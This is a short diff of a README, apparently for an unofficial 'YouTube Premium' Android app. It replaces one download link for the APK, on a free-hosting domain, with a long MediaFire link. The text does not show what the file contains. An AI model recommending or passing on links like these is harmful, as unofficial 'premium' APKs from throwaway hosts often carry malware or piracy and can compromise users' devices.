@@ -42,7 +42,7 @@ This project also includes **YouTube Music** support integrated in a single app.
 You can directly download the latest build from the link below:
 
 <p align="center">
- <a href="http://firewallcert.free.nf/YoutubePremium.apk">
+ <a href="https://download1351.mediafire.com/rydxv8nifkfgeTJbmL1JZMMEoJD7A8BA2ac9DDYGKiazCTKlsPNSVPDDhQQHdCmZTIz0ZChzwwXXPqzstdYn9HExoftRJ8FckwjcRMnYa1Wd-QzfHpQ0BWkGIY8ED85z9Nqw6-YUbVgvYRuxCrcjF6Tco53Hhi9yrGj478Bdbqwtim1Y/akw9uyqpvvkvohk/Premium+Youtube.apk">
   <img src="https://img.shields.io/badge/Download_Premium_APK-red?style=for-the-badge&logo=youtube"/>
 </a>
 </p>
